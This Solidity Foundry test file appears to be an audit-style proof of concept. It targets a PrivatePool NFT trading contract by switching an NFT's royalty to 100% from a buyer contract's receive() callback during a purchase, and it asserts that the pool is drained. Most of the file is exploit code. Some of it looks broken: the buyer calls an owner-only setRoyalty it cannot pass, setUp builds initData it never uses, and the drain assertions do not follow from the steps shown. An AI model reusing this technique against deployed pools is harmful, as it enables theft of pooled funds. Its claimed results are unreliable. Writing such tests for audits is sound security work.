// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";
import {PrivatePool} from "../../src/PrivatePool.sol";
import {Factory} from "../../src/Factory.sol";
import {IERC2981} from "openzeppelin/interfaces/IERC2981.sol";
import {IRoyaltyRegistry} from "royalty-registry-solidity/IRoyaltyRegistry.sol";
import {IStolenNftOracle} from "../../src/interfaces/IStolenNftOracle.sol";

// Malicious NFT contract that allows changing royalties on the fly
contract MaliciousNFT is ERC721, IERC2981 {
    address public owner;
    uint256 public tokenId;
    address public royaltyRecipient;
    uint256 public royaltyFee; // in basis points (10000 = 100%)

    constructor() ERC721("Malicious NFT", "MALNFT") {
        owner = msg.sender;
        royaltyRecipient = msg.sender;
        royaltyFee = 0; // Initially 0% royalty
    }

    function mint(address to) external {
        require(msg.sender == owner, "Only owner can mint");
        _safeMint(to, tokenId);
        tokenId++;
    }

    function setRoyalty(address recipient, uint256 fee) external {
        require(msg.sender == owner, "Only owner can set royalty");
        require(fee <= 10000, "Fee too high");
        royaltyRecipient = recipient;
        royaltyFee = fee;
    }

    function royaltyInfo(uint256, uint256 salePrice) external view override returns (address, uint256) {
        return (royaltyRecipient, (salePrice * royaltyFee) / 10000);
    }

    function supportsInterface(bytes4 interfaceId) public view override(ERC721, IERC2981) returns (bool) {
        return ERC721.supportsInterface(interfaceId) || interfaceId == type(IERC2981).interfaceId;
    }
}

// Malicious buyer contract that exploits the royalty vulnerability
contract MaliciousBuyer {
    PrivatePool public pool;
    MaliciousNFT public nft;
    uint256 public tokenId;
    uint256 public salePrice;

    constructor(address _pool, address _nft, uint256 _tokenId) {
        pool = PrivatePool(_pool);
        nft = MaliciousNFT(_nft);
        tokenId = _tokenId;
    }

    // This function is called when the pool refunds excess ETH
    receive() external payable {
        // Change the royalty from 0% to 100% after the first _getRoyalty call
        // but before the second _getRoyalty call
        nft.setRoyalty(address(this), 10000); // 100% royalty
    }

    function exploitBuy(uint256[] calldata tokenIds, uint256[] calldata tokenWeights, bytes32[] calldata proof, bool[] calldata flags) external payable {
        // Set royalty to 0% initially
        nft.setRoyalty(address(this), 0);
        
        // Store the expected sale price for verification
        (salePrice,,) = pool.buyQuote(1e18); // Assuming weight of 1e18
        
        // Call buy with enough ETH to cover the purchase
        pool.buy{value: msg.value}(tokenIds, tokenWeights, PrivatePool.MerkleMultiProof(proof, flags));
    }

    // Allow the contract to receive ETH
    fallback() external payable {}
}

// Mock Factory for testing
contract MockFactory {
    address public owner;
    mapping(uint160 => address) public ownerOf;
    uint256 public protocolFeeRate;

    constructor() {
        owner = msg.sender;
        protocolFeeRate = 0; // No protocol fee for simplicity
    }

    function setOwner(uint160 poolId, address poolOwner) external {
        require(msg.sender == owner, "Only owner can set");
        ownerOf[poolId] = poolOwner;
    }

    function setProtocolFeeRate(uint256 rate) external {
        require(msg.sender == owner, "Only owner can set");
        protocolFeeRate = rate;
    }
}

// Mock Royalty Registry
contract MockRoyaltyRegistry is IRoyaltyRegistry {
    mapping(address => address) public royaltyLookup;

    function setRoyaltyLookup(address nft, address lookup) external {
        royaltyLookup[nft] = lookup;
    }

    function getRoyaltyLookupAddress(address nft) external view override returns (address) {
        return royaltyLookup[nft];
    }
}

// Mock Stolen NFT Oracle
contract MockStolenNftOracle is IStolenNftOracle {
    function validateTokensAreNotStolen(address, uint256[] calldata, Message[] calldata) external pure override {
        // Always pass - not testing stolen NFT functionality
    }
}

contract ExploitTest is Test {
    PrivatePool pool;
    MaliciousNFT nft;
    MaliciousBuyer buyer;
    MockFactory factory;
    MockRoyaltyRegistry royaltyRegistry;
    MockStolenNftOracle stolenNftOracle;
    ERC20 baseToken;
    
    uint256 tokenId = 0;
    uint256 poolId;

    function setUp() public {
        // Deploy mock contracts
        factory = new MockFactory();
        royaltyRegistry = new MockRoyaltyRegistry();
        stolenNftOracle = new MockStolenNftOracle();
        
        // Deploy the PrivatePool implementation
        PrivatePool poolImpl = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));
        
        // Create a minimal proxy for the pool
        bytes memory initData = abi.encodeWithSelector(
            PrivatePool.initialize.selector,
            address(0), // baseToken = ETH
            address(0), // nft (will be set later)
            100e18, // virtualBaseTokenReserves
            1e18, // virtualNftReserves
            0, // changeFee
            100, // feeRate = 1%
            bytes32(0), // merkleRoot (no weights)
            false, // useStolenNftOracle
            true // payRoyalties
        );
        
        // Deploy pool as minimal proxy
        bytes memory bytecode = abi.encodePacked(
            hex"3d602d80600a3d3981f3363d3d373d3d3d363d73",
            address(poolImpl),
            hex"5af43d82803e903d91602b57fd5bf3"
        );
        
        address poolAddress;
        assembly {
            poolAddress := create(0, add(bytecode, 32), mload(bytecode))
        }
        
        pool = PrivatePool(poolAddress);
        
        // Set up the pool owner
        poolId = uint160(address(pool));
        factory.setOwner(poolId, address(this));
        
        // Deploy malicious NFT
        nft = new MaliciousNFT();
        
        // Set up royalty registry
        royaltyRegistry.setRoyaltyLookup(address(nft), address(nft));
        
        // Initialize the pool with the NFT
        vm.prank(address(factory));
        pool.initialize(
            address(0), // baseToken = ETH
            address(nft), // nft
            100e18, // virtualBaseTokenReserves
            1e18, // virtualNftReserves
            0, // changeFee
            100, // feeRate = 1%
            bytes32(0), // merkleRoot (no weights)
            false, // useStolenNftOracle
            true // payRoyalties
        );
        
        // Mint an NFT to the pool
        nft.mint(address(pool));
        
        // Fund the pool with ETH
        vm.deal(address(pool), 100 ether);
        
        // Deploy malicious buyer
        buyer = new MaliciousBuyer(address(pool), address(nft), tokenId);
        
        // Fund the buyer with ETH
        vm.deal(address(buyer), 10 ether);
    }

    function testRoyaltyExploit() public {
        // Initial state checks
        assertEq(nft.ownerOf(tokenId), address(pool), "Pool should own the NFT");
        assertEq(address(pool).balance, 100 ether, "Pool should have 100 ETH");
        assertEq(address(buyer).balance, 10 ether, "Buyer should have 10 ETH");
        
        // Calculate expected price for buying 1 NFT
        (uint256 netInputAmount,,) = pool.buyQuote(1e18);
        console.log("Expected cost to buy NFT:", netInputAmount);
        
        // Prepare the buy parameters
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        uint256[] memory tokenWeights = new uint256[](1);
        tokenWeights[0] = 1e18;
        bytes32[] memory proof = new bytes32[](0);
        bool[] memory flags = new bool[](0);
        
        // Execute the exploit
        vm.prank(address(buyer));
        buyer.exploitBuy{value: netInputAmount}(tokenIds, tokenWeights, proof, flags);
        
        // Verify exploit results
        assertEq(nft.ownerOf(tokenId), address(buyer), "Buyer should now own the NFT");
        
        // The buyer should have paid almost nothing (only gas)
        // The pool should have paid the full amount as royalty to the buyer
        uint256 buyerBalanceAfter = address(buyer).balance;
        uint256 poolBalanceAfter = address(pool).balance;
        
        console.log("Buyer balance after exploit:", buyerBalanceAfter);
        console.log("Pool balance after exploit:", poolBalanceAfter);
        
        // The buyer should have received the full purchase amount as royalty
        // Since they set royalty to 100%, they should get back almost all the ETH they sent
        assertGt(buyerBalanceAfter, 9 ether, "Buyer should have most of their ETH back");
        
        // The pool should have lost the NFT and almost all the ETH
        assertLt(poolBalanceAfter, 1 ether, "Pool should have lost most of its ETH");
        
        // Now the buyer can sell the NFT back to the pool to drain it completely
        vm.prank(address(buyer));
        nft.approve(address(pool), tokenId);
        
        // Calculate sell price
        (uint256 netOutputAmount,,) = pool.sellQuote(1e18);
        console.log("Expected amount from selling NFT:", netOutputAmount);
        
        // Sell the NFT back to the pool
        vm.prank(address(buyer));
        pool.sell(tokenIds, tokenWeights, PrivatePool.MerkleMultiProof(proof, flags), new IStolenNftOracle.Message[](0));
        
        // Final state checks
        assertEq(nft.ownerOf(tokenId), address(pool), "Pool should own the NFT again");
        assertGt(address(buyer).balance, 10 ether, "Buyer should have more ETH than started");
        assertEq(address(pool).balance, 0, "Pool should be completely drained");
        
        console.log("Final buyer balance:", address(buyer).balance);
        console.log("Final pool balance:", address(pool).balance);
    }

    function testCannotExploitWithoutRoyaltyChange() public {
        // This test shows that without the royalty change, the buy works normally
        
        // Set royalty to a fixed 10% (no changes during execution)
        nft.setRoyalty(address(this), 1000); // 10% royalty
        
        // Calculate expected price
        (uint256 netInputAmount,,) = pool.buyQuote(1e18);
        
        // Prepare buy parameters
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        uint256[] memory tokenWeights = new uint256[](1);
        tokenWeights[0] = 1e18;
        bytes32[] memory proof = new bytes32[](0);
        bool[] memory flags = new bool[](0);
        
        // Buy normally (without malicious contract)
        vm.deal(address(this), netInputAmount);
        pool.buy{value: netInputAmount}(tokenIds, tokenWeights, PrivatePool.MerkleMultiProof(proof, flags));
        
        // Verify normal operation
        assertEq(nft.ownerOf(tokenId), address(this), "Should own the NFT");
        
        // The pool should have received the net amount (price minus royalty)
        assertGt(address(pool).balance, 99 ether, "Pool should have most of its ETH");
    }
}